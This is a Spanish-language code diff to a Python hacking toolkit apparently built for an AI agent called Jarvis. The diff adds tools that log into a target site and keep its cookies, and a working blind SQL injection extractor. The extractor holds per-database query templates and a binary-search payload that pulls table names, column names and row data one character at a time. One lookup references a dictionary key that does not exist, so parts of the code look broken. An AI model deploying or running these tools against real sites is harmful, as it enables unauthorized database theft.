@@ -1,7 +1,7 @@
 """Manos de hacking de Jarvis. Solo Python puro: sirve en Vercel y Termux."""
 import base64, hashlib, hmac, json, re, socket, ssl, time
 from concurrent.futures import ThreadPoolExecutor
-from urllib.parse import urlparse, urljoin
+from urllib.parse import urlparse, urljoin, urlencode
 import requests
 from flask import g
 
@@ -331,7 +331,7 @@ def probar_idor(url, desde=None, hasta=None):
 
 NOMBRES = ('huella_web', 'peticion_http', 'enumerar_rutas', 'analizar_js',
            'decodificar_jwt', 'probar_idor', 'escanear_puertos', 'ver_certificado',
-           'dns_registros', 'probar_sqli')
+           'dns_registros', 'probar_sqli', 'abrir_sesion', 'verificar_sesion', 'extraer_sqli')
 
 def herramienta(nombre, args):
     a = args if isinstance(args, dict) else {}
@@ -357,6 +357,16 @@ def herramienta(nombre, args):
             return dns_registros(a.get('dominio') or a.get('url'))
         if nombre == 'probar_sqli':
             return probar_sqli(a.get('url'), a.get('parametro'), a.get('metodo'), a.get('cuerpo'))
+        if nombre == 'abrir_sesion':
+            return abrir_sesion(a.get('url'), a.get('usuario'), a.get('clave'),
+                                 a.get('campo_usuario') or 'usuario', a.get('campo_clave') or 'clave',
+                                 a.get('metodo') or 'POST', a.get('campo_extra'))
+        if nombre == 'verificar_sesion':
+            return verificar_sesion(a.get('url'))
+        if nombre == 'extraer_sqli':
+            return extraer_sqli(a.get('url'), a.get('parametro'), a.get('dbms'),
+                                a.get('que') or 'tablas', a.get('tabla') or '', a.get('columna') or '',
+                                a.get('desde') or 1, a.get('largo') or 12, a.get('metodo') or 'GET', a.get('cuerpo'))
     except Exception as e:
         print('[HACK]', e)
         return {'ok': False, 'error': 'fallo la herramienta: ' + str(e)[:150]}
@@ -394,6 +404,19 @@ HERRAMIENTAS = [
     _e('probar_sqli', 'Prueba inyeccion SQL en un parametro: por error, ciega booleana y por tiempo. '
        'Confirma o descarta, no adivina.', {'url': {'type': 'string'}, 'parametro': {'type': 'string'},
        'metodo': {'type': 'string'}, 'cuerpo': {'type': 'string'}}, ('url', 'parametro')),
+    _e('abrir_sesion', 'Abre sesion en el objetivo y guarda las galletas. Necesario para probar lo autenticado.',
+       {'url': {'type': 'string'}, 'usuario': {'type': 'string'}, 'clave': {'type': 'string'},
+        'campo_usuario': {'type': 'string'}, 'campo_clave': {'type': 'string'},
+        'metodo': {'type': 'string'}, 'campo_extra': {'type': 'string', 'description': 'pares k=v por comas'}},
+       ('url', 'usuario', 'clave')),
+    _e('verificar_sesion', 'Comprueba si la sesion sigue viva.', {'url': {'type': 'string'}}, ('url',)),
+    _e('extraer_sqli', 'Extrae datos de una inyeccion ya confirmada: base, tablas, columnas o filas.',
+       {'url': {'type': 'string'}, 'parametro': {'type': 'string'},
+        'dbms': {'type': 'string', 'description': 'MySQL, MSSQL, Oracle, PostgreSQL o SQLite'},
+        'que': {'type': 'string', 'description': 'db, tablas, columnas o datos'},
+        'tabla': {'type': 'string'}, 'columna': {'type': 'string'},
+        'desde': {'type': 'integer'}, 'largo': {'type': 'integer'}},
+       ('url', 'parametro', 'dbms')),
 ]
 
 ERRORES_SQL = {
@@ -486,3 +509,139 @@ def probar_sqli(url, parametro, metodo='GET', cuerpo=None):
     res['nota'] = ('Confirmado: usa peticion_http para extraer datos (UNION SELECT o boolean a ciegas). '
                    'Si solo hay tiempo, es ciego y hay que extraer letra por letra.')
     return res
+
+PALABRAS_FALLO = ('incorrect', 'invalido', 'inválido', 'no existe', 'rechaz', 'denegado',
+                  'failed', 'invalid', 'error de', 'credenciales')
+_ABIERTAS = {}
+
+def _ocultos(html):
+    d = {}
+    for m in re.findall(r'<input[^>]+type=["\']hidden["\'][^>]*>', html or '', re.I):
+        n = re.search(r'name=["\']([^"\']+)', m, re.I)
+        v = re.search(r'value=["\']([^"\']*)', m, re.I)
+        if n:
+            d[n.group(1)] = v.group(1) if v else ''
+    return d
+
+def abrir_sesion(url, usuario, clave, campo_usuario='usuario', campo_clave='clave',
+                 metodo='POST', campo_extra=None):
+    u = _norm(url)
+    if not u:
+        return {'ok': False, 'error': 'URL invalida'}
+    pagina, _ = _pedir(u)
+    datos = _ocultos(pagina.text if pagina is not None else '')
+    if campo_extra:
+        for par in str(campo_extra).split(','):
+            if '=' in par:
+                k, v = par.split('=', 1)
+                datos[k.strip()] = v.strip()
+    datos[campo_usuario] = usuario
+    datos[campo_clave] = clave
+    r, err = _pedir(u, metodo, {'Content-Type': 'application/x-www-form-urlencoded'},
+                    urlencode(datos), seguir=True)
+    if err:
+        return err
+    bajo = (r.text or '')[:5000].lower()
+    quedo_en_login = 'login' in r.url.lower() or 'dashboard/home' in r.url.lower()
+    fallo = any(p in bajo for p in PALABRAS_FALLO) and quedo_en_login
+    if fallo:
+        return {'ok': False, 'error': 'no entro: credenciales rechazadas o nombres de campo equivocados',
+                'url_final': r.url, 'status': r.status_code,
+                'ocultos_enviados': list(datos)[:10], 'muestra': _recorte(r.text, 600)}
+    _ABIERTAS[_chat()] = {'url': u, 'usuario': usuario}
+    return {'ok': True, 'url_final': r.url, 'status': r.status_code,
+            'galletas': [c.name for c in _sesion().cookies],
+            'nota': 'Sesion abierta: las siguientes peticiones van con estas galletas. Verifica con verificar_sesion.'}
+
+def verificar_sesion(url):
+    u = _norm(url)
+    if not u:
+        return {'ok': False, 'error': 'URL invalida'}
+    r, err = _pedir(u)
+    if err:
+        return err
+    vivo = 'login' not in r.url.lower()
+    return {'ok': True, 'sesion_viva': vivo, 'status': r.status_code, 'url_final': r.url,
+            'nota': 'Si sesion_viva es false, volviste a caer al login y hay que abrir sesion otra vez.'}
+
+CONSULTAS = {
+    'db': {'MySQL': 'SELECT database()', 'MSSQL': 'SELECT db_name()',
+           'PostgreSQL': 'SELECT current_database()', 'Oracle': 'SELECT ora_database_name FROM dual',
+           'SQLite': "SELECT 'sqlite'"},
+    'tablas': {'MySQL': "SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()",
+               'MSSQL': "SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'",
+               'PostgreSQL': "SELECT STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
+               'Oracle': "SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables",
+               'SQLite': "SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'"},
+    'columnas': {'MySQL': "SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='{t}'",
+                 'MSSQL': "SELECT STRING_AGG(name,',') FROM syscolumns WHERE id=OBJECT_ID('{t}')",
+                 'PostgreSQL': "SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='{t}'",
+                 'Oracle': "SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='{t}'",
+                 'SQLite': "SELECT GROUP_CONCAT(name) FROM pragma_table_info('{t}')"},
+    'datos': {'MySQL': "SELECT GROUP_CONCAT({c} SEPARATOR '|') FROM {t}",
+              'MSSQL': "SELECT STRING_AGG(CAST({c} AS VARCHAR(200)),'|') FROM {t}",
+              'PostgreSQL': "SELECT STRING_AGG(CAST({c} AS TEXT),'|') FROM {t}",
+              'Oracle': "SELECT LISTAGG({c},'|') WITHIN GROUP (ORDER BY 1) FROM {t}",
+              'SQLite': "SELECT GROUP_CONCAT({c},'|') FROM {t}"},
+}
+
+def _cond(dbms, consulta, i, mid):
+    sub = 'SUBSTR' if dbms == 'Oracle' else 'SUBSTRING'
+    asc = 'UNICODE' if dbms == 'SQLite' else 'ASCII'
+    return f"' AND {asc}({sub}(({consulta}),{i},1))>{mid}-- -"
+
+def _bin(pedir, consulta, desde, largo):
+    salida = ''
+    for i in range(desde, desde + largo):
+        lo, hi, c = 32, 126, 0
+        while lo <= hi:
+            mid = (lo + hi) // 2
+            r, e = pedir(consulta, i, mid)
+            if e or r is None:
+                return salida, 'se corto'
+            if r:
+                c, lo = mid, mid + 1
+            else:
+                hi = mid - 1
+        if c <= 32:
+            break
+        salida += chr(c)
+    return salida, ''
+
+def extraer_sqli(url, parametro, dbms, que='tablas', tabla='', columna='',
+                 desde=1, largo=12, metodo='GET', cuerpo=None):
+    u = _norm(url)
+    if not u or not parametro:
+        return {'ok': False, 'error': 'hacen falta url y parametro'}
+    dbms = next((d for d in CONSULTAS['que'] if d.lower() == str(dbms).lower()), '')
+    if not dbms:
+        return {'ok': False, 'error': 'dbms debe ser uno de: ' + ', '.join(CONSULTAS['que'])}
+    plantilla = CONSULTAS.get(que, {}).get(dbms)
+    if not plantilla:
+        return {'ok': False, 'error': 'que debe ser db, tablas, columnas o datos'}
+    if que in ('columnas', 'datos') and not tabla:
+        return {'ok': False, 'error': 'falta la tabla'}
+    if que == 'datos' and not columna:
+        return {'ok': False, 'error': 'falta la columna'}
+    consulta = plantilla.replace('{t}', tabla).replace('{c}', columna)
+    largo = max(1, min(int(largo or 12), 40))
+    desde = max(1, int(desde or 1))
+    m = 'POST' if str(metodo).upper() == 'POST' else 'GET'
+
+    def pedir(cons, i, mid):
+        carga = _cond(dbms, cons, i, mid)
+        if m == 'POST':
+            r, e = _pedir(u, 'POST', {'Content-Type': 'application/x-www-form-urlencoded'},
+                          _pon_cuerpo(cuerpo, parametro, carga))
+        else:
+            r, e = _pedir(_pon(u, parametro, carga))
+        if e or r is None:
+            return None, e
+        return r.status_code < 500, None
+
+    t0 = time.time()
+    texto, corte = _bin(pedir, consulta, desde, largo)
+    return {'ok': True, 'dbms': dbms, 'que': que, 'consulta': consulta,
+            'desde': desde, 'largo_pedido': largo, 'texto': texto, 'corte': corte,
+            'segundos': round(time.time() - t0, 1),
+            'nota': 'Sigue con desde=%d para el siguiente tramo. Si sale vacio, prueba largo menor o revisa la condicion.' % (desde + len(texto))}
